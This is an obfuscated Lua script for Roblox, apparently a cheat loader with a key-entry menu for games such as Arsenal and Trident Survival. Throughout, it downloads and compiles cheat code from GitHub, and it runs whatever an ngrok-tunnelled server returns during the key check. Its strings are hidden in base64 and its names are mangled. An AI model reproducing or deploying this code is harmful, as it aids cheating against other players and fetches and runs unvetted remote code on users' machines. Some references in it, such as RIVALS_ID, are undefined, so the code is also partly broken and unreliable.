
--[ game id pour charger les bon scripts ]--
local ARSENAL_ID = 286090429
local TRIDENT_SURVIVAL_ID = 13253735473
local AIMBOT_FFA_ID = 97986109236479

--[ chargement de jeu ]--
local ARSENAL_SCRIPT_URL = loadstring(game:HttpGet("https://raw.githubusercontent.com/CheaterOnTop/ByYTBmaxxmaxx_11-universalV2/refs/heads/main/arsenal"))
local TRIDENT_SCRIPT_URL = loadstring(game:HttpGet("https://raw.githubusercontent.com/CheaterOnTop/ByYTBmaxxmaxx_11-universalV2/refs/heads/main/Trident%20Survival%20V5"))
local AIMBOT_FFA_SCRIPT_URL = loadstring(game:HttpGet("https://raw.githubusercontent.com/CheaterOnTop/ByYTBmaxxmaxx_11-universalV2/refs/heads/main/Aimbot%20FFA"))
local UNIVERSAL_SCRIPT_URL = loadstring(game:HttpGet("https://raw.githubusercontent.com/CheaterOnTop/ByYTBmaxxmaxx_11-universalV2/refs/heads/main/universal"))

local DISCORD_LINK = "https://discord.gg/C27sdkDjqv"
local NGROK_URL = "https://aba1-92-184-123-188.ngrok-free.app"
local NGROK_URL = "https://0f2d-92-184-123-188.ngrok-free.app"
local function _0xdec(str)
    local _0xabc = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
    local _0xdef = ""
    local _0xghi = 0
    local _0xjkl = 0
    for _0xmno = 1, #str do
        local _0xpqr = str:sub(_0xmno, _0xmno)
        if _0xpqr ~= "=" then
            local _0xstu = string.find(_0xabc, _0xpqr, 1, true)
            if not _0xstu then
                warn(_0xdec("SW52YWxpZCBCYXNlNjQgY2hhcmFjdGVyOiA=") .. _0xpqr)
                return nil
            end
            _0xstu = _0xstu - 1
            _0xghi = _0xghi * 64 + _0xstu
            _0xjkl = _0xjkl + 6
            if _0xjkl >= 8 then
                _0xjkl = _0xjkl - 8
                local _0xvwx = math.floor(_0xghi / 2^_0xjkl) % 256
                _0xdef = _0xdef .. string.char(_0xvwx)
                _0xghi = _0xghi % 2^_0xjkl
            end
        end
    end
    return _0xdef
end

--[ Hall principal ]--
local function _0x789(_0xxyz)
    if not _0xxyz or _0xxyz == "" then
        warn(_0xdec("RmFpbGVkIHRvIHJldHJpZXZlIGtleTogVVJMIHBvaW50IG5vdCBkZWZpbmVk"))
        return nil
    end

    if not string.match(_0xxyz, "^https://") then
        _0xxyz = "https://" .. _0xxyz
    end

    local _0x123 = math.random(1, 100) * 42
    if _0x123 > 0 then _0x123 = _0x123 - 1 end

    local _0x456 = "R0l5Zl9"
    local _0x789a = "fMW1KaU"
    local _0xbcd = "hFTXpBW"
    local _0xefe = "UtjTA=="

    local _0x111 = _0x456 .. _0x789a .. _0xbcd .. _0xefe
    local _0x222 = _0xdec(_0x111)
    if not _0x222 then
        warn(_0xdec("RmFpbGVkIHRvIGRlY29kZSB0b2tlbg=="))
        return nil
    end

    local _0x333 = ""
    for _0x444 = 1, #_0x222 do
        local _0x555 = _0x222:sub(_0x444, _0x444)
        if _0x555:match("%w") then
            _0x333 = _0x333 .. _0x555
        else
            _0x333 = _0x333 .. string.format("%%%02X", string.byte(_0x555))
        end
    end

    local _0x666 = _0xxyz .. _0xdec("L3VzZXJfa2V5X2ZyZWU/dG9rZW49") .. _0x333

    local _0x777, _0x888 = pcall(function()
        return game:HttpGet(_0x666)
    end)
    if not _0x777 then
        warn(_0xdec("RmFpbGVkIHRvIHJldHJpZXZlIGtleSBmcm9tIHNlcnZlcg=="))
        return nil
    end

    local _0x999, _0xaaa = pcall(function()
        local _0xbbb = game:HttpGet(_0x666)
        local _0xccc = loadstring(_0xbbb)
        if _0xccc then
            return _0xccc()
        else
            warn(_0xdec("RmFpbGVkIHRvIGNvbXBpbGUga2V5IHJldHJpZXZhbCBzY3JpcHQ="))
            return nil
        end
    end)

    if _0x999 and _0xaaa then
        if _0xaaa == _0xdec("RXJyZXVyIDogVG9rZW4gaW52YWxpZGU=") then
            warn(_0xdec("RmFpbGVkIHRvIHJldHJpZXZlIGtleTogSW52YWxpZCB0b2tlbg=="))
            return nil
        end
        print(_0xdec("S2V5IHJldHJpZXZlZCBzdWNjZXNzZnVsbHkh"))
        return _0xaaa
    else
        warn(_0xdec("RmFpbGVkIHRvIHJldHJpZXZlIGtleSBmcm9tIHNlcnZlcg=="))
        return nil
    end
end

local _0xddd = {};

--[ menu pour la key ]--
_0xddd["1"] = Instance.new("Folder", game:GetService("CoreGui").RobloxGui);

_0xddd["2"] = Instance.new("Frame", _0xddd["1"]);
_0xddd["2"]["BorderSizePixel"] = 0;
_0xddd["2"]["BackgroundColor3"] = Color3.fromRGB(10, 0, 32);
_0xddd["2"]["AnchorPoint"] = Vector2.new(0.5, 0.5);
_0xddd["2"]["Position"] = UDim2.new(0.5, 0, 0.5, 0);
_0xddd["2"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
_0xddd["2"]["Name"] = [[_0xffff]];
_0xddd["2"]["Size"] = UDim2.new(0, 250, 0, 200);

_0xddd["3"] = Instance.new("LocalScript", _0xddd["2"]);
_0xddd["3"]["Name"] = [[_0x1111]];

_0xddd["40"] = Instance.new("Frame", _0xddd["2"]);
_0xddd["40"]["Visible"] = true;
_0xddd["40"]["BorderSizePixel"] = 0;
_0xddd["40"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
_0xddd["40"]["Size"] = UDim2.new(1, 0, 1, 0);
_0xddd["40"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
_0xddd["40"]["Name"] = [[_0x2222]];
_0xddd["40"]["BackgroundTransparency"] = 1;

_0xddd["44"] = Instance.new("TextLabel", _0xddd["40"]);
_0xddd["44"]["TextWrapped"] = true;
_0xddd["44"]["ZIndex"] = 4;
_0xddd["44"]["BorderSizePixel"] = 0;
_0xddd["44"]["TextScaled"] = true;
_0xddd["44"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
_0xddd["44"]["TextSize"] = 14;
_0xddd["44"]["Font"] = Enum.Font.SourceSans;
_0xddd["44"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
_0xddd["44"]["BackgroundTransparency"] = 1;
_0xddd["44"]["Size"] = UDim2.new(1, 0, 0, 28);
_0xddd["44"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
_0xddd["44"]["Text"] = _0xdec("Tm92YSBTY3JpcHQ=");
_0xddd["44"]["Name"] = [[_0x3333]];
_0xddd["44"]["Position"] = UDim2.new(0, 0, 0, 12);

_0xddd["47"] = Instance.new("Frame", _0xddd["40"]);
_0xddd["47"]["BorderSizePixel"] = 0;
_0xddd["47"]["BackgroundColor3"] = Color3.fromRGB(12, 8, 50);
_0xddd["47"]["AnchorPoint"] = Vector2.new(1, 1);
_0xddd["47"]["Size"] = UDim2.new(1, -30, 0, 35);
_0xddd["47"]["Position"] = UDim2.new(1, -15, 0, 80);
_0xddd["47"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
_0xddd["47"]["Name"] = [[_0x4444]];

_0xddd["48"] = Instance.new("UICorner", _0xddd["47"]);
_0xddd["48"]["CornerRadius"] = UDim.new(0, 4);

_0xddd["49"] = Instance.new("UIStroke", _0xddd["47"]);
_0xddd["49"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
_0xddd["49"]["Color"] = Color3.fromRGB(56, 44, 94);

_0xddd["4a"] = Instance.new("TextBox", _0xddd["47"]);
_0xddd["4a"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
_0xddd["4a"]["PlaceholderColor3"] = Color3.fromRGB(98, 94, 164);
_0xddd["4a"]["BorderSizePixel"] = 0;
_0xddd["4a"]["TextTruncate"] = Enum.TextTruncate.AtEnd;
_0xddd["4a"]["TextSize"] = 14;
_0xddd["4a"]["Name"] = [[_0x5555]];
_0xddd["4a"]["BackgroundColor3"] = Color3.fromRGB(12, 8, 50);
_0xddd["4a"]["Font"] = Enum.Font.SourceSans;
_0xddd["4a"]["AnchorPoint"] = Vector2.new(0.5, 0);
_0xddd["4a"]["PlaceholderText"] = _0xdec("ZW50ZXIga2V5");
_0xddd["4a"]["Size"] = UDim2.new(1, -20, 0, 35);
_0xddd["4a"]["Position"] = UDim2.new(0.5, 0, 0, 0);
_0xddd["4a"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
_0xddd["4a"]["Text"] = [[]];
_0xddd["4a"]["BackgroundTransparency"] = 1;

_0xddd["41"] = Instance.new("TextButton", _0xddd["40"]);
_0xddd["41"]["BorderSizePixel"] = 0;
_0xddd["41"]["TextSize"] = 18;
_0xddd["41"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
_0xddd["41"]["BackgroundColor3"] = Color3.fromRGB(12, 8, 50);
_0xddd["41"]["Font"] = Enum.Font.SourceSans;
_0xddd["41"]["AnchorPoint"] = Vector2.new(1, 1);
_0xddd["41"]["Size"] = UDim2.new(0.5, -15, 0, 35);
_0xddd["41"]["Name"] = [[_0x6666]];
_0xddd["41"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
_0xddd["41"]["Text"] = _0xdec("bG9naW4=");
_0xddd["41"]["Position"] = UDim2.new(0.5, -10, 1, -15);

_0xddd["42"] = Instance.new("UICorner", _0xddd["41"]);
_0xddd["42"]["CornerRadius"] = UDim.new(0, 4);

_0xddd["43"] = Instance.new("UIStroke", _0xddd["41"]);
_0xddd["43"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
_0xddd["43"]["Color"] = Color3.fromRGB(56, 44, 94);

_0xddd["discord"] = Instance.new("TextButton", _0xddd["40"]);
_0xddd["discord"]["BorderSizePixel"] = 0;
_0xddd["discord"]["TextSize"] = 14;
_0xddd["discord"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
_0xddd["discord"]["BackgroundColor3"] = Color3.fromRGB(12, 8, 50);
_0xddd["discord"]["Font"] = Enum.Font.SourceSans;
_0xddd["discord"]["AnchorPoint"] = Vector2.new(1, 1);
_0xddd["discord"]["Size"] = UDim2.new(0.5, -15, 0, 35);
_0xddd["discord"]["Name"] = [[_0x7777]];
_0xddd["discord"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
_0xddd["discord"]["Text"] = _0xdec("R2V0IEtleSAoRGlzY29yZCk=");
_0xddd["discord"]["Position"] = UDim2.new(1, -15, 1, -15);

_0xddd["discord_corner"] = Instance.new("UICorner", _0xddd["discord"]);
_0xddd["discord_corner"]["CornerRadius"] = UDim.new(0, 4);

_0xddd["discord_stroke"] = Instance.new("UIStroke", _0xddd["discord"]);
_0xddd["discord_stroke"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
_0xddd["discord_stroke"]["Color"] = Color3.fromRGB(56, 44, 94);

_0xddd["3c"] = Instance.new("Frame", _0xddd["2"]);
_0xddd["3c"]["Visible"] = false;
_0xddd["3c"]["ZIndex"] = 999999;
_0xddd["3c"]["BorderSizePixel"] = 0;
_0xddd["3c"]["BackgroundColor3"] = Color3.fromRGB(10, 0, 32);
_0xddd["3c"]["Size"] = UDim2.new(1, 0, 1, -2);
_0xddd["3c"]["Position"] = UDim2.new(0, 0, 0, 2);
_0xddd["3c"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
_0xddd["3c"]["Name"] = [[_0x8888]];

_0xddd["3d"] = Instance.new("TextLabel", _0xddd["3c"]);
_0xddd["3d"]["BorderSizePixel"] = 0;
_0xddd["3d"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
_0xddd["3d"]["TextSize"] = 14;
_0xddd["3d"]["Font"] = Enum.Font.SourceSans;
_0xddd["3d"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
_0xddd["3d"]["BackgroundTransparency"] = 1;
_0xddd["3d"]["Size"] = UDim2.new(1, 0, 1, 0);
_0xddd["3d"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
_0xddd["3d"]["Text"] = [[]];

local function _0x9999()
    local _0xaaaa = game:GetService("UserInputService")
    local _0xbbbb = _0xddd["2"]
    
    local _0xcccc
    local _0xdddd
    local _0xeeee
    local _0xfffff
    
    local function _0xgggg(_0xhhhh)
        local _0xiiii = _0xhhhh.Position - _0xeeee
        _0xbbbb.Position = UDim2.new(_0xfffff.X.Scale, _0xfffff.X.Offset + _0xiiii.X, _0xfffff.Y.Scale, _0xfffff.Y.Offset + _0xiiii.Y)
    end
    
    _0xbbbb.InputBegan:Connect(function(_0xhhhh)
        if _0xhhhh.UserInputType == Enum.UserInputType.MouseButton1 or _0xhhhh.UserInputType == Enum.UserInputType.Touch then
            _0xcccc = true
            _0xeeee = _0xhhhh.Position
            _0xfffff = _0xbbbb.Position
    
            _0xhhhh.Changed:Connect(function()
                if _0xhhhh.UserInputState == Enum.UserInputState.End then
                    _0xcccc = false
                end
            end)
        end
    end)
    
    _0xbbbb.InputChanged:Connect(function(_0xhhhh)
        if _0xhhhh.UserInputType == Enum.UserInputType.MouseMovement or _0xhhhh.UserInputType == Enum.UserInputType.Touch then
            _0xdddd = _0xhhhh
        end
    end)
    
    _0xaaaa.InputChanged:Connect(function(_0xhhhh)
        if _0xhhhh == _0xdddd and _0xcccc then
            _0xgggg(_0xhhhh)
        end
    end)
end;
task.spawn(_0x9999);

local function _0xjjjj()
    local _0xkkkk = game:GetService("TweenService")

    local _0xllll = _0xddd["2"];
    if not _0xllll then
        warn(_0xdec("RmFpbGVkIHRvIGNyZWF0ZSBtYWluIGZyYW1lIGluIENvcmVHdWkuUm9ibG94R3Vp"))
        return
    end
    local _0xmmmm = _0xllll._0x8888;
    local _0xnnnn = _0xllll._0x2222;
    local _0xoooo = UDim2.new(0, 250, 0, 200);

    local _0xpppp = function(_0xqqqq)
        _0xmmmm.Transparency = 1;
        _0xmmmm.Visible = true;
        _0xmmmm.TextLabel.Text = _0xqqqq;
        task.wait(2);
        _0xmmmm.Visible = false;
        _0xmmmm.TextLabel.Text = "";
    end

    local _0xrrrr = function()
        local _0xssss = game.PlaceId
        if _0xssss == ARSENAL_ID then
            ARSENAL_SCRIPT_URL()
        elseif _0xssss == TRIDENT_SURVIVAL_ID then
            TRIDENT_SCRIPT_URL()
        elseif _0xssss == AIMBOT_FFA_ID then
            AIMBOT_FFA_SCRIPT_URL()
        elseif _0xssss == RIVALS_ID then
            RIVALS_SCRIPT_URL()
        else
            UNIVERSAL_SCRIPT_URL()
        end
        _0xddd["2"].Parent:Destroy();
    end

    local _0xtttt = function()
        local _0xuuuu = false
        local _0xvvvv; 
        _0xvvvv = _0xnnnn._0x6666.MouseButton1Click:Connect(function()
            if _0xuuuu then return end
            _0xuuuu = true

            local _0xwwww = _0xnnnn._0x4444._0x5555.Text
            if _0xwwww == "" then
                _0xpppp(_0xdec("UGxlYXNlIGVudGVyIGEga2V5"))
                _0xuuuu = false
                return
            end

            _0xpppp(_0xdec("Q2hlY2tpbmcga2V5Li4u"))
            local _0xxxxx = _0x789(NGROK_URL)

            if not _0xxxxx then
                _0xpppp(_0xdec("RmFpbGVkIHRvIHJldHJpZXZlIGtleSBmcm9tIHNlcnZlcg=="))
                _0xuuuu = false
                return
            end

            if _0xwwww == _0xxxxx then
                _0xpppp(_0xdec("S2V5IHZhbGlkISBMb2FkaW5nIHNjcmlwdC4uLg=="))
                _0xvvvv:Disconnect()
                _0xrrrr()
            else
                _0xpppp(_0xdec("SW52YWxpZCBrZXk="))
            end
            _0xuuuu = false
        end)

        local _0xyyyy;
        _0xyyyy = _0xnnnn._0x7777.MouseButton1Click:Connect(function()
            setclipboard(DISCORD_LINK)
            _0xpppp(_0xdec("RGlzY29yZCBsaW5rIGNvcGllZCB0byBjbGlwYm9hcmQh"))
        end)

        _0xnnnn.Visible = true;
        _0xmmmm.Visible = false;
    end

    _0xllll.Size = _0xoooo
    _0xmmmm.Visible = false;
    _0xtttt()
end;
task.spawn(_0xjjjj);

return _0xddd["1"], require;